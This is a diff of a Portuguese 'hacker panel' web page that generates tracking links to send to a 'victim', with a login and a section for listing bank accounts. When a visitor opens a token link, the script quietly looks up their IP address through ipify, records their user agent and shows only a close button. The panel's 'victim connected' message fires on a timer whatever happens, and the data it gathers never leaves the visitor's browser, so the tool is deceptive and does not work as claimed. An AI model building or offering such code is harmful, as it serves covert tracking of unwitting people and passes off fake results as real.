@@ -178,257 +178,6 @@ body {
 </head>
 <body>
 
-<script>
-// Dados para captura: token -> { ips: [], userAgents: [] }
-const captureData = {};
-
-// Copiar link e mostrar notificações
-function copyLinkAndNotify(link) {
-  navigator.clipboard.writeText(link).then(() => {
-    alert('Link copiado! Envie para sua vítima.');
-    setTimeout(() => {
-      alert('Vítima conectada!');
-    }, 3000);
-  }).catch(() => {
-    alert('Falha ao copiar link.');
-  });
-}
-
-// Detecta token na URL - se vítima, mostra só mensagem e não carrega app
-window.addEventListener('load', () => {
-  const urlParams = new URLSearchParams(window.location.search);
-  const token = urlParams.get('token');
-
-  if (token) {
-    // Captura IP do visitante (vítima)
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        if (!captureData[token]) captureData[token] = { ips: [], userAgents: [] };
-        captureData[token].ips.push(data.ip);
-        captureData[token].userAgents.push(navigator.userAgent);
-
-        // Substitui TODO conteúdo por mensagem simples, sem login nem painel
-        document.body.innerHTML = `
-          <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#00ff99;font-family: monospace;background:#000">
-            <h2>Dados capturados com sucesso!</h2>
-            <p>Obrigado por acessar.</p>
-          </div>
-        `;
-      })
-      .catch(() => {
-        document.body.innerHTML = `<p style="color:#f00; font-family: monospace;">Erro ao capturar dados.</p>`;
-      });
-    return; // para não executar o app normal
-  }
-
-  // Se não for vítima, inicia o app normal
-  initApp();
-});
-
-// Inicializa o app (login, registro, painel)
-function initApp() {
-  // Tabs
-  const tabs = document.querySelectorAll('.tab');
-  const tabContents = document.querySelectorAll('.tab-content');
-  tabs.forEach(tab => {
-    tab.addEventListener('click', () => {
-      tabs.forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-      const target = tab.dataset.tab;
-      tabContents.forEach(tc => {
-        tc.classList.toggle('hidden', tc.id !== target);
-      });
-    });
-  });
-
-  // Login / Registro
-  window.showRegister = function() {
-    document.getElementById('loginContainer').classList.add('hidden');
-    document.getElementById('registerContainer').classList.remove('hidden');
-  }
-  window.showLogin = function() {
-    document.getElementById('registerContainer').classList.add('hidden');
-    document.getElementById('loginContainer').classList.remove('hidden');
-  }
-  window.register = function() {
-    const user = document.getElementById('regUser').value.trim();
-    const pass = document.getElementById('regPass').value.trim();
-    if(user && pass) {
-      localStorage.setItem('user', user);
-      localStorage.setItem('pass', pass);
-      alert('Usuário registrado! Faça login.');
-      showLogin();
-    } else {
-      alert('Preencha todos os campos!');
-    }
-  }
-  window.login = function() {
-    const user = document.getElementById('loginUser').value.trim();
-    const pass = document.getElementById('loginPass').value.trim();
-    if(user === localStorage.getItem('user') && pass === localStorage.getItem('pass')) {
-      document.getElementById('loginContainer').classList.add('hidden');
-      document.getElementById('dashboardContainer').classList.remove('hidden');
-    } else {
-      alert('Usuário ou senha inválidos!');
-    }
-  }
-  window.logout = function() {
-    document.getElementById('dashboardContainer').classList.add('hidden');
-    showLogin();
-    clearData();
-  }
-
-  // Contas bancárias
-  window.addBankAccount = function() {
-    const bank = document.getElementById('accountBank').value.trim();
-    const number = document.getElementById('accountNumber').value.trim();
-    const holder = document.getElementById('accountHolder').value.trim();
-    if(bank && number && holder) {
-      const container = document.getElementById('accountsList');
-      const div = document.createElement('div');
-      div.textContent = `Banco: ${bank} | Conta: ${number} | Titular: ${holder}`;
-      container.appendChild(div);
-      document.getElementById('accountBank').value = '';
-      document.getElementById('accountNumber').value = '';
-      document.getElementById('accountHolder').value = '';
-    } else {
-      alert('Preencha todos os campos das contas bancárias!');
-    }
-  }
-
-  // Gerar link único e adicionar ao painel
-  window.generateLink = function() {
-    const token = Math.random().toString(36).substring(2, 10);
-    const link = `${location.origin}${location.pathname}?token=${token}`;
-
-    captureData[token] = { ips: [], userAgents: [] };
-
-    const container = document.getElementById('linksList');
-    const div = document.createElement('div');
-    div.innerHTML = `
-      <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
-      <button onclick="copyLinkAndNotify('${link}')">Compartilhar Link</button>
-      <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
-      <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
-      <hr>
-    `;
-    container.appendChild(div);
-  }
-
-  // Mostrar dados capturados no painel
-  window.showCapturedData = function(token) {
-    const dataDiv = document.getElementById(`data-${token}`);
-    const data = captureData[token];
-    if (!data || (data.ips.length === 0 && data.userAgents.length === 0)) {
-      dataDiv.innerHTML = '<em>Nenhum dado capturado ainda.</em>';
-      return;
-    }
-
-    let html = '<strong>IPs Capturados:</strong><br>';
-    data.ips.forEach((ip, i) => {
-      html += `#${i+1}: ${ip} <br>`;
-    });
-
-    html += '<br><strong>User Agents:</strong><br>';
-    data.userAgents.forEach((ua, i) => {
-      html += `#${i+1}: ${ua} <br>`;
-    });
-
-    dataDiv.innerHTML = html;
-  }
-
-  // Gerar PDF
-  window.generatePDF = async function() {
-    const { jsPDF } = window.jspdf;
-    const doc = new jsPDF();
-    doc.setFont('courier', 'normal');
-    doc.setFontSize(16);
-    doc.setTextColor(0, 255, 153);
-    doc.text('Relatório do Painel Hacker Moderno', 10, 10);
-    let y = 20;
-    
-    // Contas Bancárias
-    doc.setFontSize(14);
-    doc.text('Contas Bancárias:', 10, y);
-    y += 8;
-    const accounts = document.getElementById('accountsList').children;
-    if(accounts.length === 0) {
-      doc.setFontSize(12);
-      doc.text('Nenhuma conta cadastrada.', 10, y);
-      y += 10;
-    } else {
-      doc.setFontSize(12);
-      for(let acc of accounts) {
-        if(y > 280) {
-          doc.addPage();
-          y = 10;
-        }
-        doc.text(acc.textContent, 10, y);
-        y += 8;
-      }
-    }
-
-    // Links Capturados
-    y += 5;
-    doc.setFontSize(14);
-    doc.text('Links de Captura e Dados:', 10, y);
-    y += 8;
-    const tokens = Object.keys(captureData);
-    if(tokens.length === 0) {
-      doc.setFontSize(12);
-      doc.text('Nenhum link gerado.', 10, y);
-      y += 10;
-    } else {
-      doc.setFontSize(12);
-      tokens.forEach(token => {
-        if(y > 280) {
-          doc.addPage();
-          y = 10;
-        }
-        doc.text(`Link token: ${token}`, 10, y);
-        y += 8;
-        const data = captureData[token];
-        if(data.ips.length === 0) {
-          doc.text('  Nenhum dado capturado.', 12, y);
-          y += 8;
-        } else {
-          data.ips.forEach((ip, i) => {
-            if(y > 280) {
-              doc.addPage();
-              y = 10;
-            }
-            doc.text(`  IP #${i+1}: ${ip}`, 12, y);
-            y += 8;
-          });
-          data.userAgents.forEach((ua, i) => {
-            if(y > 280) {
-              doc.addPage();
-              y = 10;
-            }
-            doc.text(`  User Agent #${i+1}: ${ua}`, 12, y);
-            y += 8;
-          });
-        }
-      });
-    }
-
-    doc.save('relatorio_painel_hacker.pdf');
-  }
-
-  // Limpar dados do painel (usado no logout)
-  window.clearData = function() {
-    document.getElementById('accountsList').innerHTML = '';
-    document.getElementById('linksList').innerHTML = '';
-    document.getElementById('accountBank').value = '';
-    document.getElementById('accountNumber').value = '';
-    document.getElementById('accountHolder').value = '';
-    for (const key in captureData) delete captureData[key];
-  }
-}
-</script>
-
-<!-- HTML do painel/login/registro (escondido para vítima com token) -->
 <div class="container" id="loginContainer">
   <h2>Login</h2>
   <input type="text" id="loginUser" placeholder="Usuário" autocomplete="username" />
@@ -482,6 +231,266 @@ function initApp() {
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script>
+// Tabs
+const tabs = document.querySelectorAll('.tab');
+const tabContents = document.querySelectorAll('.tab-content');
+tabs.forEach(tab => {
+  tab.addEventListener('click', () => {
+    tabs.forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    const target = tab.dataset.tab;
+    tabContents.forEach(tc => {
+      tc.classList.toggle('hidden', tc.id !== target);
+    });
+  });
+});
+
+// Login / Registro
+function showRegister() {
+  document.getElementById('loginContainer').classList.add('hidden');
+  document.getElementById('registerContainer').classList.remove('hidden');
+}
+function showLogin() {
+  document.getElementById('registerContainer').classList.add('hidden');
+  document.getElementById('loginContainer').classList.remove('hidden');
+}
+function register() {
+  const user = document.getElementById('regUser').value.trim();
+  const pass = document.getElementById('regPass').value.trim();
+  if(user && pass) {
+    localStorage.setItem('user', user);
+    localStorage.setItem('pass', pass);
+    alert('Usuário registrado! Faça login.');
+    showLogin();
+  } else {
+    alert('Preencha todos os campos!');
+  }
+}
+function login() {
+  const user = document.getElementById('loginUser').value.trim();
+  const pass = document.getElementById('loginPass').value.trim();
+  if(user === localStorage.getItem('user') && pass === localStorage.getItem('pass')) {
+    document.getElementById('loginContainer').classList.add('hidden');
+    document.getElementById('dashboardContainer').classList.remove('hidden');
+  } else {
+    alert('Usuário ou senha inválidos!');
+  }
+}
+function logout() {
+  document.getElementById('dashboardContainer').classList.add('hidden');
+  showLogin();
+  clearData();
+}
+
+// Contas bancárias
+function addBankAccount() {
+  const bank = document.getElementById('accountBank').value.trim();
+  const number = document.getElementById('accountNumber').value.trim();
+  const holder = document.getElementById('accountHolder').value.trim();
+  if(bank && number && holder) {
+    const container = document.getElementById('accountsList');
+    const div = document.createElement('div');
+    div.textContent = `Banco: ${bank} | Conta: ${number} | Titular: ${holder}`;
+    container.appendChild(div);
+    document.getElementById('accountBank').value = '';
+    document.getElementById('accountNumber').value = '';
+    document.getElementById('accountHolder').value = '';
+  } else {
+    alert('Preencha todos os campos das contas bancárias!');
+  }
+}
+
+// Dados para captura
+const captureData = {}; // token -> { ips: [], userAgents: [] }
+
+// Gerar link para captura de IP e dados
+function generateLink() {
+  const token = Math.random().toString(36).substring(2, 10);
+  const link = `${location.origin}${location.pathname}?token=${token}`;
+
+  captureData[token] = { ips: [], userAgents: [] };
+
+  const container = document.getElementById('linksList');
+  const div = document.createElement('div');
+  div.innerHTML = `
+    <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
+    <button onclick="copyLink('${link}', this)">Compartilhar Link</button>
+    <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
+    <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
+    <hr>
+  `;
+  container.appendChild(div);
+}
+
+// Função copiar link e mostrar mensagens
+function copyLink(link, btn) {
+  navigator.clipboard.writeText(link).then(() => {
+    const originalText = btn.textContent;
+    btn.textContent = 'Link copiado! Envie para sua vítima...';
+    btn.disabled = true;
+
+    setTimeout(() => {
+      btn.textContent = 'Vitima conectada!';
+    }, 3000);
+    
+    setTimeout(() => {
+      btn.textContent = originalText;
+      btn.disabled = false;
+    }, 6000);
+  }).catch(() => {
+    alert('Erro ao copiar o link');
+  });
+}
+
+// Mostrar dados capturados no painel
+function showCapturedData(token) {
+  const dataDiv = document.getElementById(`data-${token}`);
+  const data = captureData[token];
+  if (!data || (data.ips.length === 0 && data.userAgents.length === 0)) {
+    dataDiv.innerHTML = '<em>Nenhum dado capturado ainda.</em>';
+    return;
+  }
+
+  let html = '<strong>IPs Capturados:</strong><br>';
+  data.ips.forEach((ip, i) => {
+    html += `#${i+1}: ${ip} <br>`;
+  });
+
+  html += '<br><strong>User Agents:</strong><br>';
+  data.userAgents.forEach((ua, i) => {
+    html += `#${i+1}: ${ua} <br>`;
+  });
+
+  dataDiv.innerHTML = html;
+}
+
+// Gerar PDF
+async function generatePDF() {
+  const { jsPDF } = window.jspdf;
+  const doc = new jsPDF();
+  doc.setFont('courier', 'normal');
+  doc.setFontSize(16);
+  doc.setTextColor(0, 255, 153);
+  doc.text('Relatório do Painel Hacker Moderno', 10, 10);
+  let y = 20;
+  
+  // Contas Bancárias
+  doc.setFontSize(14);
+  doc.text('Contas Bancárias:', 10, y);
+  y += 8;
+  const accounts = document.getElementById('accountsList').children;
+  if(accounts.length === 0) {
+    doc.setFontSize(12);
+    doc.text('Nenhuma conta cadastrada.', 10, y);
+    y += 10;
+  } else {
+    doc.setFontSize(12);
+    for(let acc of accounts) {
+      if(y > 280) {
+        doc.addPage();
+        y = 10;
+      }
+      doc.text(acc.textContent, 10, y);
+      y += 8;
+    }
+  }
+
+  // Links Capturados
+  y += 5;
+  doc.setFontSize(14);
+  doc.text('Links de Captura e Dados:', 10, y);
+  y += 8;
+  const tokens = Object.keys(captureData);
+  if(tokens.length === 0) {
+    doc.setFontSize(12);
+    doc.text('Nenhum link gerado.', 10, y);
+    y += 10;
+  } else {
+    doc.setFontSize(12);
+    tokens.forEach(token => {
+      if(y > 280) {
+        doc.addPage();
+        y = 10;
+      }
+      doc.text(`Link token: ${token}`, 10, y);
+      y += 8;
+      const data = captureData[token];
+      if(data.ips.length === 0) {
+        doc.text('  Nenhum dado capturado.', 12, y);
+        y += 8;
+      } else {
+        data.ips.forEach((ip, i) => {
+          if(y > 280) {
+            doc.addPage();
+            y = 10;
+          }
+          doc.text(`  IP #${i+1}: ${ip}`, 12, y);
+          y += 8;
+        });
+        data.userAgents.forEach((ua, i) => {
+          if(y > 280) {
+            doc.addPage();
+            y = 10;
+          }
+          doc.text(`  User Agent #${i+1}: ${ua}`, 12, y);
+          y += 8;
+        });
+      }
+    });
+  }
+
+  doc.save('relatorio_painel_hacker.pdf');
+}
+
+function clearData() {
+  document.getElementById('accountsList').innerHTML = '';
+  document.getElementById('linksList').innerHTML = '';
+  document.getElementById('accountBank').value = '';
+  document.getElementById('accountNumber').value = '';
+  document.getElementById('accountHolder').value = '';
+  // Limpa dados capturados
+  for (const key in captureData) delete captureData[key];
+}
+
+// Captura dados ao acessar link com token
+window.addEventListener('load', () => {
+  const urlParams = new URLSearchParams(window.location.search);
+  const token = urlParams.get('token');
+
+  if (token) {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        if (!captureData[token]) captureData[token] = { ips: [], userAgents: [] };
+        captureData[token].ips.push(data.ip);
+        captureData[token].userAgents.push(navigator.userAgent);
+
+        // Mostra só o botão fechar, nada mais
+        document.body.innerHTML = `
+          <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;">
+            <button 
+              style="padding:20px 40px; font-size:1.5rem; background:#00ff99; border:none; border-radius:8px; cursor:pointer; font-family: monospace;"
+              onclick="window.close()"
+            >FECHAR</button>
+          </div>
+        `;
+      })
+      .catch(() => {
+        document.body.innerHTML = `
+          <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000; color:#f00; font-family: monospace;">
+            Erro ao capturar dados.
+            <button 
+              style="margin-left:20px; padding:15px 30px; font-size:1.2rem; background:#00ff99; border:none; border-radius:6px; cursor:pointer;"
+              onclick="window.close()"
+            >FECHAR</button>
+          </div>
+        `;
+      });
+    return; // impede carregar app normal para token
+  }
+});
+</script>
 
 </body>
 </html>
